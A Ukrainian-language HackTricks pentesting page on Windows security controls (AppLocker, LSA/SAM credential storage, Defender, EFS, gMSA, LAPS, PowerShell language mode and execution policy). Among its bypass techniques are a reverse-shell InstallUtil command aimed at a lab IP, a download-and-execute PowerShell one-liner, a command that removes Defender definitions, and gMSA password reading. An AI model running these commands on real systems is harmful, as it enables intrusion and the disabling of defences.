# Контроль безпеки Windows

{{#include ../../banners/hacktricks-training.md}}

## Політика AppLocker

Список дозволених програм - це список затверджених програм або виконуваних файлів, які можуть бути присутніми та виконуватись на системі. Мета полягає в захисті середовища від шкідливого програмного забезпечення та незатверджених програм, які не відповідають конкретним бізнес-потребам організації.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) - це **рішення Microsoft для білого списку програм** і надає адміністраторам системи контроль над **тим, які програми та файли можуть виконувати користувачі**. Воно забезпечує **досить детальний контроль** над виконуваними файлами, скриптами, файлами установників Windows, DLL, упакованими додатками та установниками упакованих додатків.\
Зазвичай організації **блокують cmd.exe та PowerShell.exe** та запис у певні каталоги, **але це все можна обійти**.

### Перевірка

Перевірте, які файли/розширення знаходяться в чорному/білому списках:
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Цей шлях реєстру містить конфігурації та політики, застосовані AppLocker, що забезпечує можливість перегляду поточного набору правил, що застосовуються в системі:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Обхід

- Корисні **записувані папки** для обходу політики AppLocker: Якщо AppLocker дозволяє виконувати будь-що всередині `C:\Windows\System32` або `C:\Windows`, є **записувані папки**, які ви можете використовувати для **обходу цього**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Загальновідомі **достовірні** [**"LOLBAS's"**](https://lolbas-project.github.io/) двійкові файли також можуть бути корисними для обходу AppLocker.
- **Погано написані правила також можуть бути обійдені**
- Наприклад, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, ви можете створити **папку під назвою `allowed`** будь-де, і вона буде дозволена.
- Організації також часто зосереджуються на **блокуванні виконуваного файлу `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, але забувають про **інші** [**місця виконуваних файлів PowerShell**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) такі як `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` або `PowerShell_ISE.exe`.
- **Примус DLL дуже рідко активується** через додаткове навантаження, яке він може створити на системі, і кількість тестування, необхідного для забезпечення того, щоб нічого не зламалося. Тому використання **DLL як бекдорів допоможе обійти AppLocker**.
- Ви можете використовувати [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) або [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) для **виконання коду Powershell** в будь-якому процесі та обходу AppLocker. Для отримання додаткової інформації перегляньте: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Зберігання облікових даних

### Менеджер безпеки облікових записів (SAM)

Локальні облікові дані присутні в цьому файлі, паролі хешуються.

### Локальний орган безпеки (LSA) - LSASS

**Облікові дані** (хешовані) **зберігаються** в **пам'яті** цього підсистеми з причин єдиного входу.\
**LSA** адмініструє локальну **політику безпеки** (політика паролів, дозволи користувачів...), **аутентифікацію**, **токени доступу**...\
LSA буде тим, хто **перевірить** надані облікові дані в файлі **SAM** (для локального входу) і **спілкуватиметься** з **контролером домену** для аутентифікації користувача домену.

**Облікові дані** **зберігаються** всередині **процесу LSASS**: квитки Kerberos, хеші NT і LM, легко розшифровані паролі.

### Секрети LSA

LSA може зберігати на диску деякі облікові дані:

- Пароль облікового запису комп'ютера Active Directory (недоступний контролер домену).
- Паролі облікових записів служб Windows
- Паролі для запланованих завдань
- Інше (пароль додатків IIS...)

### NTDS.dit

Це база даних Active Directory. Вона присутня лише в контролерах домену.

## Захисник

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) - це антивірус, доступний у Windows 10 і Windows 11, а також у версіях Windows Server. Він **блокує** загальні інструменти для пентестингу, такі як **`WinPEAS`**. Однак є способи **обійти ці захисти**.

### Перевірка

Щоб перевірити **статус** **Захисника**, ви можете виконати командлет PS **`Get-MpComputerStatus`** (перевірте значення **`RealTimeProtectionEnabled`**, щоб дізнатися, чи активний він):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Щоб перерахувати його, ви також можете запустити:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS захищає файли через шифрування, використовуючи **симетричний ключ**, відомий як **File Encryption Key (FEK)**. Цей ключ шифрується за допомогою **публічного ключа** користувача і зберігається в альтернативному потоці даних $EFS зашифрованого файлу. Коли потрібно розшифрування, використовується відповідний **приватний ключ** цифрового сертифіката користувача для розшифрування FEK з потоку $EFS. Більше деталей можна знайти [тут](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Сценарії розшифрування без ініціації користувача** включають:

- Коли файли або папки переміщуються на файлову систему, що не підтримує EFS, наприклад, [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), вони автоматично розшифровуються.
- Зашифровані файли, надіслані через мережу за протоколом SMB/CIFS, розшифровуються перед передачею.

Цей метод шифрування дозволяє **прозорий доступ** до зашифрованих файлів для власника. Однак просте зміна пароля власника та вхід в систему не дозволить розшифрування.

**Основні висновки**:

- EFS використовує симетричний FEK, зашифрований за допомогою публічного ключа користувача.
- Розшифрування використовує приватний ключ користувача для доступу до FEK.
- Автоматичне розшифрування відбувається за певних умов, таких як копіювання на FAT32 або передача по мережі.
- Зашифровані файли доступні власнику без додаткових кроків.

### Check EFS info

Перевірте, чи **користувач** **використовував** цю **послугу**, перевіривши, чи існує цей шлях:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Перевірте, **хто** має **доступ** до файлу, використовуючи cipher /c \<file>\
Ви також можете використовувати `cipher /e` та `cipher /d` всередині папки для **шифрування** та **розшифрування** всіх файлів

### Decrypting EFS files

#### Being Authority System

Цей спосіб вимагає, щоб **жертва** **виконувала** **процес** всередині хоста. Якщо це так, використовуючи сесії `meterpreter`, ви можете видати токен процесу користувача (`impersonate_token` з `incognito`). Або ви можете просто `migrate` до процесу користувача.

#### Knowing the users password

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## Group Managed Service Accounts (gMSA)

Microsoft розробила **Group Managed Service Accounts (gMSA)** для спрощення управління обліковими записами служб у ІТ-інфраструктурах. На відміну від традиційних облікових записів служб, які часто мають налаштування "**Пароль ніколи не закінчується**", gMSA пропонують більш безпечне та кероване рішення:

- **Автоматичне управління паролями**: gMSA використовують складний, 240-символьний пароль, який автоматично змінюється відповідно до політики домену або комп'ютера. Цей процес обробляється службою розподілу ключів Microsoft (KDC), що усуває необхідність ручного оновлення паролів.
- **Покращена безпека**: Ці облікові записи не підлягають блокуванню і не можуть використовуватися для інтерактивних входів, що підвищує їх безпеку.
- **Підтримка кількох хостів**: gMSA можуть бути спільними між кількома хостами, що робить їх ідеальними для служб, що працюють на кількох серверах.
- **Можливість запланованих завдань**: На відміну від керованих облікових записів служб, gMSA підтримують виконання запланованих завдань.
- **Спрощене управління SPN**: Система автоматично оновлює Service Principal Name (SPN) при змінах у деталях sAMaccount комп'ютера або DNS-імені, спрощуючи управління SPN.

Паролі для gMSA зберігаються в властивості LDAP _**msDS-ManagedPassword**_ і автоматично скидаються кожні 30 днів контролерами домену (DC). Цей пароль, зашифрований об'єкт даних, відомий як [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), може бути отриманий лише авторизованими адміністраторами та серверами, на яких встановлені gMSA, що забезпечує безпечне середовище. Для доступу до цієї інформації потрібне захищене з'єднання, таке як LDAPS, або з'єднання повинно бути автентифіковане з 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)

Ви можете прочитати цей пароль за допомогою [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Знайдіть більше інформації в цьому пості**](https://cube0x0.github.io/Relaying-for-gMSA/)

Також перегляньте цю [веб-сторінку](https://cube0x0.github.io/Relaying-for-gMSA/) про те, як виконати **NTLM relay attack** для **читання** **пароля** **gMSA**.

## LAPS

**Рішення для паролів локального адміністратора (LAPS)**, доступне для завантаження з [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), дозволяє керувати паролями локальних адміністраторів. Ці паролі, які є **випадковими**, унікальними та **регулярно змінюються**, зберігаються централізовано в Active Directory. Доступ до цих паролів обмежений через ACL для авторизованих користувачів. За наявності достатніх прав надається можливість читати паролі локальних адміністраторів.

{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Режим обмеженої мови**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **блокує багато функцій**, необхідних для ефективного використання PowerShell, таких як блокування COM-об'єктів, дозволяючи лише затверджені типи .NET, XAML-робочі процеси, класи PowerShell та інше.

### **Перевірте**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Обхід
```powershell
#Easy bypass
Powershell -version 2
```
У сучасному Windows цей обхід не спрацює, але ви можете використовувати [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Щоб скомпілювати його, вам може знадобитися** **додати посилання** -> _Browse_ -> _Browse_ -> додати `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` і **змінити проект на .Net4.5**.

#### Прямий обхід:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Зворотний шелл:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Ви можете використовувати [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) або [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick), щоб **виконати код Powershell** в будь-якому процесі та обійти обмежений режим. Для отримання додаткової інформації перегляньте: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Політика виконання PS

За замовчуванням вона встановлена на **обмежену.** Основні способи обійти цю політику:
```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Більше можна знайти [тут](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Інтерфейс постачальника підтримки безпеки (SSPI)

Це API, яке можна використовувати для автентифікації користувачів.

SSPI буде відповідати за пошук відповідного протоколу для двох машин, які хочуть спілкуватися. Переважним методом для цього є Kerberos. Потім SSPI буде вести переговори про те, який протокол автентифікації буде використовуватися, ці протоколи автентифікації називаються постачальниками підтримки безпеки (SSP), розташовані в кожній машині Windows у формі DLL, і обидві машини повинні підтримувати один і той же, щоб мати можливість спілкуватися.

### Основні SSP

- **Kerberos**: Переважний
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** та **NTLMv2**: З причин сумісності
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Веб-сервери та LDAP, пароль у формі MD5 хешу
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL та TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Використовується для переговорів про протокол, який слід використовувати (Kerberos або NTLM, при цьому Kerberos є за замовчуванням)
- %windir%\Windows\System32\lsasrv.dll

#### Переговори можуть запропонувати кілька методів або лише один.

## UAC - Контроль облікових записів користувачів

[Контроль облікових записів користувачів (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) - це функція, яка дозволяє **запит на згоду для підвищених дій**.

{{#ref}}
uac-user-account-control.md
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
